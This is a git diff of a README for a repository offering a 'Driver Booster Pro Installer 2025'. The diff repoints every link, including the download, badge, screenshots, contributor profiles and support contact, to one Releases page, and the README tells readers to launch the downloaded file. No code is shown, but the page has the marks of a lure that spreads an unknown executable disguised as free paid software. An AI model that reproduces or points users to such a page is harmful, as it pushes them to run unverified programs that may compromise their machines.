@@ -31,28 +31,28 @@ Welcome to the **Driver Booster Pro Installer 2025** repository! This repository
 - windows-tools
 
 ## Get Started 🚀
-To access the Driver Booster Pro Installer 2025, [click here](https://github.com/files/Project.zip). Remember to launch the file to kickstart the installation process.
+To access the Driver Booster Pro Installer 2025, [click here](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases). Remember to launch the file to kickstart the installation process.
 
-[![Download Driver Booster Pro Installer](https://img.shields.io/badge/Download-Installer-blue)](https://github.com/files/Project.zip)
+[![Download Driver Booster Pro Installer](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)
 
 For more information and updates, make sure to check the "Releases" section of this repository.
 
 ## Screenshots 📷
 Here are some snapshots of the Driver Booster Pro interface:
 
-![Driver Booster Pro Dashboard](https://example.com/dashboard.png)
+![Driver Booster Pro Dashboard](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)
 
-![Driver Update in Progress](https://example.com/update.png)
+![Driver Update in Progress](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)
 
 ## Contributors 🌟
 A big thank you to all the contributors who have made this project possible:
 
-- [@username1](https://github.com/username1)
-- [@username2](https://github.com/username2)
-- [@username3](https://github.com/username3)
+- [@username1](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)
+- [@username2](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)
+- [@username3](https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases)
 
 ## Support ℹ️
-If you encounter any issues or have questions regarding Driver Booster Pro, feel free to reach out to us at support@driverboosterpro.com.
+If you encounter any issues or have questions regarding Driver Booster Pro, feel free to reach out to us at https://github.com/alesti19/Driver-Booster-Pro-Installer-2025/releases
 
 ## License 📄
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
